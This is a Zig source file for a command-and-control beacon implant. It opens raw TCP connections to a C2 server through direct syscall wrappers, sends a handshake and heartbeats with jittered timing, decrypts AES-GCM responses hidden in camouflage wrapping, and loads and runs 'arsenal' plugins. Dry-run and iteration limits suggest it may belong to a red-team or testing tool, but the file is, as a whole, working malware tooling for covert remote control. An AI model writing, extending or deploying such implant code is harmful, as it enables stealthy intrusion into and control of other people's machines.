//! C2 beacon — heartbeat loop with adaptive timing and raw TCP HTTP.
//! Uses direct syscall wrappers for all network I/O.
//! Handshake responses are VoidStream-encrypted with camouflage wrapping.
const std = @import("std");
const config = @import("config.zig");
const syscall = @import("syscall.zig");
const voidstream = @import("voidstream.zig");
const plugin_loader = @import("plugin_loader.zig");

pub const BeaconConfig = struct {
    c2_addr: []const u8,
    c2_port: u16,
    profile: config.Profile,
    session_id: [64]u8,
    session_id_len: u8,
    dry_run: bool,
    max_runtime_s: u32,
    max_iterations: u32,
    verbose: bool,

    pub fn init(addr: []const u8, port: u16, dry_run: bool) BeaconConfig {
        return .{
            .c2_addr = addr,
            .c2_port = port,
            .profile = config.PROFILE_AGGRESSIVE,
            .session_id = .{0} ** 64,
            .session_id_len = 0,
            .dry_run = dry_run,
            .max_runtime_s = 60,
            .max_iterations = 10,
            .verbose = false,
        };
    }

    pub fn getSessionId(self: *const BeaconConfig) []const u8 {
        return self.session_id[0..self.session_id_len];
    }

    pub fn setSessionId(self: *BeaconConfig, id: []const u8) void {
        const copy_len = @min(id.len, 64);
        @memcpy(self.session_id[0..copy_len], id[0..copy_len]);
        self.session_id_len = @intCast(copy_len);
    }
};

/// Open a raw TCP connection to the C2 server. Returns socket fd or -1.
fn tcpConnect(addr: []const u8, port: u16) isize {
    const ip = syscall.parseIpv4(addr) catch return -1;
    const sockaddr = syscall.SockaddrIn.init(ip, port);

    const fd = syscall.sys_socket(config.AF_INET, config.SOCK_STREAM, 0);
    if (fd < 0) return fd;

    const addr_ptr: [*]const u8 = @ptrCast(&sockaddr);
    const rc = syscall.sys_connect(@intCast(fd), addr_ptr, @sizeOf(syscall.SockaddrIn));
    if (rc < 0) {
        _ = syscall.sys_close(@intCast(fd));
        return rc;
    }
    return fd;
}

/// Send an HTTP request and read response into buf. Returns bytes read.
fn httpRequest(
    fd: usize,
    method: []const u8,
    path: []const u8,
    host: []const u8,
    session_id: []const u8,
    body: []const u8,
    resp_buf: []u8,
) isize {
    var req_buf: [2048]u8 = undefined;
    var written: usize = 0;

    // Request line
    written += copySlice(&req_buf, written, method);
    written += copySlice(&req_buf, written, " ");
    written += copySlice(&req_buf, written, path);
    written += copySlice(&req_buf, written, " HTTP/1.1\r\nHost: ");
    written += copySlice(&req_buf, written, host);
    written += copySlice(&req_buf, written, "\r\nConnection: close\r\nUser-Agent: phantom-beacon/1.0\r\n");

    if (session_id.len > 0) {
        written += copySlice(&req_buf, written, "X-Session-ID: ");
        written += copySlice(&req_buf, written, session_id);
        written += copySlice(&req_buf, written, "\r\n");
    }

    if (body.len > 0) {
        var len_buf: [16]u8 = undefined;
        const len_str = std.fmt.bufPrint(&len_buf, "{d}", .{body.len}) catch return -1;
        written += copySlice(&req_buf, written, "Content-Type: application/json\r\nContent-Length: ");
        written += copySlice(&req_buf, written, len_str);
        written += copySlice(&req_buf, written, "\r\n\r\n");
        written += copySlice(&req_buf, written, body);
    } else {
        written += copySlice(&req_buf, written, "\r\n");
    }

    // Send request via raw syscall
    const send_rc = syscall.sys_write_syscall(fd, &req_buf, written);
    if (send_rc < 0) return send_rc;

    // Read response
    const recv_rc = syscall.sys_read(fd, resp_buf.ptr, resp_buf.len);
    return recv_rc;
}

/// Perform C2 handshake. Populates cfg.session_id on success.
/// The C2 returns VoidStream-encrypted, camouflage-wrapped responses.
pub fn doHandshake(cfg: *BeaconConfig) void {
    if (cfg.dry_run) {
        config.jsonLog("info", "handshake", "\"dry_run\":true,\"endpoint\":\"" ++ config.C2_HANDSHAKE ++ "\"");
        cfg.setSessionId("dry-run-session-0001");
        return;
    }

    const fd = tcpConnect(cfg.c2_addr, cfg.c2_port);
    if (fd < 0) {
        var buf: [96]u8 = undefined;
        const extra = std.fmt.bufPrint(&buf, "\"error\":\"connect_failed\",\"rc\":{d}", .{fd}) catch return;
        config.jsonLog("warn", "handshake", extra);
        cfg.setSessionId("offline-session");
        return;
    }
    defer _ = syscall.sys_close(@intCast(fd));

    const body =
        \\{"agent":"phantom-beacon","version":"1.0","arch":"x86_64"}
    ;

    var resp_buf: [65536]u8 = undefined;
    const rc = httpRequestFull(
        @intCast(fd),
        "POST",
        config.C2_HANDSHAKE,
        cfg.c2_addr,
        "",
        body,
        &resp_buf,
    );

    if (rc <= 0) {
        config.jsonLog("warn", "handshake", "\"error\":\"no_response\"");
        cfg.setSessionId("no-response-session");
        return;
    }

    const resp = resp_buf[0..@intCast(rc)];

    // Split HTTP headers from body at \r\n\r\n
    var content_type: []const u8 = "application/json";
    var http_body: []const u8 = resp;

    if (std.mem.indexOf(u8, resp, "\r\n\r\n")) |hdr_end| {
        const headers = resp[0..hdr_end];
        http_body = resp[hdr_end + 4 ..];
        // Extract Content-Type from headers
        content_type = extractHeaderValue(headers, "Content-Type") orelse "application/json";
    }

    if (cfg.verbose) {
        var dbg_buf: [256]u8 = undefined;
        const dbg = std.fmt.bufPrint(&dbg_buf, "\"content_type\":\"{s}\",\"body_len\":{d},\"total_len\":{d}", .{
            content_type, http_body.len, rc,
        }) catch "";
        config.jsonLog("debug", "handshake_response", dbg);
    }

    // Try VoidStream decrypt (unwrap camouflage + AES-256-GCM)
    var plaintext_buf: [4096]u8 = undefined;
    if (voidstream.processResponse(content_type, http_body, &plaintext_buf)) |pt_len| {
        const plaintext = plaintext_buf[0..pt_len];
        if (cfg.verbose) {
            var dbg2: [256]u8 = undefined;
            const d2 = std.fmt.bufPrint(&dbg2, "\"decrypted_len\":{d}", .{pt_len}) catch "";
            config.jsonLog("debug", "voidstream_decrypt_ok", d2);
        }
        // Parse session_id from decrypted JSON
        if (extractJsonValue(plaintext, "session_id")) |sid| {
            cfg.setSessionId(sid);
        } else {
            cfg.setSessionId("decrypted-no-sid");
        }
    } else |_| {
        // VoidStream failed — fall back to plain JSON parse on raw body
        if (cfg.verbose) {
            config.jsonLog("debug", "voidstream_fallback", "\"reason\":\"decrypt_failed_trying_plain\"");
        }
        if (extractJsonValue(http_body, "session_id")) |sid| {
            cfg.setSessionId(sid);
        } else {
            cfg.setSessionId("unknown-session");
        }
    }

    var extra_buf: [128]u8 = undefined;
    const extra = std.fmt.bufPrint(&extra_buf, "\"session_id\":\"{s}\",\"status\":\"ok\"", .{cfg.getSessionId()}) catch return;
    config.jsonLog("info", "handshake", extra);
}

/// Send a heartbeat to the C2 server.
pub fn doHeartbeat(cfg: *BeaconConfig) void {
    if (cfg.dry_run) {
        var buf: [128]u8 = undefined;
        const extra = std.fmt.bufPrint(&buf,
            \\"dry_run":true,"session_id":"{s}"
        , .{cfg.getSessionId()}) catch return;
        config.jsonLog("info", "heartbeat", extra);
        return;
    }

    const fd = tcpConnect(cfg.c2_addr, cfg.c2_port);
    if (fd < 0) {
        config.jsonLog("warn", "heartbeat", "\"error\":\"connect_failed\"");
        return;
    }
    defer _ = syscall.sys_close(@intCast(fd));

    var resp_buf: [4096]u8 = undefined;
    const rc = httpRequest(
        @intCast(fd),
        "GET",
        config.C2_HEARTBEAT,
        cfg.c2_addr,
        cfg.getSessionId(),
        "",
        &resp_buf,
    );

    var extra_buf: [128]u8 = undefined;
    const extra = std.fmt.bufPrint(&extra_buf,
        \\"session_id":"{s}","response_bytes":{d}
    , .{ cfg.getSessionId(), rc }) catch return;
    config.jsonLog("info", "heartbeat", extra);
}

/// Compute sleep interval with jitter.
fn computeInterval(profile: config.Profile) u64 {
    const base: u64 = profile.base_interval_ms;
    const jitter_range = (base * profile.jitter_percent) / 100;
    if (jitter_range == 0) return base;

    // Use timestamp low bits as cheap entropy source
    const ts: u64 = @bitCast(std.time.milliTimestamp());
    const jitter = ts % (jitter_range * 2);
    const result = base -| jitter_range +| jitter;
    return if (result == 0) base else result;
}

/// Main beacon loop.
pub fn beaconLoop(cfg: *BeaconConfig) void {
    const start_ts = std.time.timestamp();
    var iteration: u32 = 0;

    config.jsonLog("info", "beacon_loop_start", "\"status\":\"running\"");

    while (iteration < cfg.max_iterations) : (iteration += 1) {
        // Check max runtime
        const elapsed: u64 = @intCast(std.time.timestamp() - start_ts);
        if (elapsed >= cfg.max_runtime_s) {
            var buf: [64]u8 = undefined;
            const extra = std.fmt.bufPrint(&buf,
                \\"reason":"max_runtime","elapsed_s":{d}
            , .{elapsed}) catch break;
            config.jsonLog("info", "beacon_loop_stop", extra);
            break;
        }

        // Heartbeat
        doHeartbeat(cfg);

        // Adaptive sleep
        const sleep_ms = computeInterval(cfg.profile);
        if (cfg.verbose) {
            var buf: [64]u8 = undefined;
            const extra = std.fmt.bufPrint(&buf,
                \\"sleep_ms":{d},"iteration":{d}
            , .{ sleep_ms, iteration }) catch "";
            config.jsonLog("debug", "sleep", extra);
        }
        syscall.sleepMs(sleep_ms);
    }

    var final_buf: [64]u8 = undefined;
    const final_extra = std.fmt.bufPrint(&final_buf,
        \\"iterations":{d}
    , .{iteration}) catch return;
    config.jsonLog("info", "beacon_loop_done", final_extra);
}

/// Load and execute arsenal plugins after handshake.
/// Wraps plugin_loader for integration into the beacon flow.
pub fn loadArsenalPlugins(cfg: *const BeaconConfig, arsenal_dir: []const u8) void {
    plugin_loader.loadAndRunPlugins(arsenal_dir, cfg.dry_run, cfg.verbose);
}

// ── Helpers ─────────────────────────────────────────────────────────────

/// Like httpRequest but reads the full response (multiple reads until EOF/close).
fn httpRequestFull(
    fd: usize,
    method: []const u8,
    path: []const u8,
    host: []const u8,
    session_id: []const u8,
    body: []const u8,
    resp_buf: []u8,
) isize {
    var req_buf: [2048]u8 = undefined;
    var written: usize = 0;

    written += copySlice(&req_buf, written, method);
    written += copySlice(&req_buf, written, " ");
    written += copySlice(&req_buf, written, path);
    written += copySlice(&req_buf, written, " HTTP/1.1\r\nHost: ");
    written += copySlice(&req_buf, written, host);
    written += copySlice(&req_buf, written, "\r\nConnection: close\r\nUser-Agent: phantom-beacon/1.0\r\n");

    if (session_id.len > 0) {
        written += copySlice(&req_buf, written, "X-Session-ID: ");
        written += copySlice(&req_buf, written, session_id);
        written += copySlice(&req_buf, written, "\r\n");
    }

    if (body.len > 0) {
        var len_buf: [16]u8 = undefined;
        const len_str = std.fmt.bufPrint(&len_buf, "{d}", .{body.len}) catch return -1;
        written += copySlice(&req_buf, written, "Content-Type: application/json\r\nContent-Length: ");
        written += copySlice(&req_buf, written, len_str);
        written += copySlice(&req_buf, written, "\r\n\r\n");
        written += copySlice(&req_buf, written, body);
    } else {
        written += copySlice(&req_buf, written, "\r\n");
    }

    const send_rc = syscall.sys_write_syscall(fd, &req_buf, written);
    if (send_rc < 0) return send_rc;

    // Read response in a loop until EOF (read returns 0) or error
    var total: usize = 0;
    while (total < resp_buf.len) {
        const n = syscall.sys_read(fd, resp_buf[total..].ptr, resp_buf.len - total);
        if (n <= 0) break; // EOF or error
        total += @intCast(n);
    }
    if (total == 0) return -1;
    return @intCast(total);
}

/// Extract a header value from raw HTTP headers (before \r\n\r\n).
/// Searches for "Name: value\r\n" and returns value.
fn extractHeaderValue(headers: []const u8, name: []const u8) ?[]const u8 {
    // Try both "Name: " (standard) and lowercase
    var search_buf: [64]u8 = undefined;
    const needle = std.fmt.bufPrint(&search_buf, "{s}: ", .{name}) catch return null;

    // Case-insensitive search: scan line by line
    var pos: usize = 0;
    while (pos < headers.len) {
        // Find end of this header line
        const line_end = std.mem.indexOfPos(u8, headers, pos, "\r\n") orelse headers.len;
        const line = headers[pos..line_end];

        // Check if this line starts with our header name (case-insensitive)
        if (line.len >= needle.len and asciiCaseInsensitiveEqual(line[0..needle.len], needle)) {
            return line[needle.len..];
        }

        pos = if (line_end + 2 <= headers.len) line_end + 2 else headers.len;
    }
    return null;
}

fn asciiCaseInsensitiveEqual(a: []const u8, b: []const u8) bool {
    if (a.len != b.len) return false;
    for (a, b) |ca, cb| {
        if (asciiToLower(ca) != asciiToLower(cb)) return false;
    }
    return true;
}

fn asciiToLower(c: u8) u8 {
    return if (c >= 'A' and c <= 'Z') c + 32 else c;
}

fn copySlice(dest: []u8, offset: usize, src: []const u8) usize {
    const end = @min(offset + src.len, dest.len);
    const actual = end - offset;
    if (actual > 0) {
        @memcpy(dest[offset..end], src[0..actual]);
    }
    return actual;
}

/// Extract a string value from a simple JSON blob: {"key":"value"}.
fn extractJsonValue(data: []const u8, key: []const u8) ?[]const u8 {
    // Search for "key":"
    var search_buf: [128]u8 = undefined;
    const needle = std.fmt.bufPrint(&search_buf, "\"{s}\":\"", .{key}) catch return null;

    if (std.mem.indexOf(u8, data, needle)) |pos| {
        const val_start = pos + needle.len;
        if (val_start >= data.len) return null;
        // Find closing quote
        if (std.mem.indexOfScalarPos(u8, data, val_start, '"')) |val_end| {
            return data[val_start..val_end];
        }
    }
    return null;
}
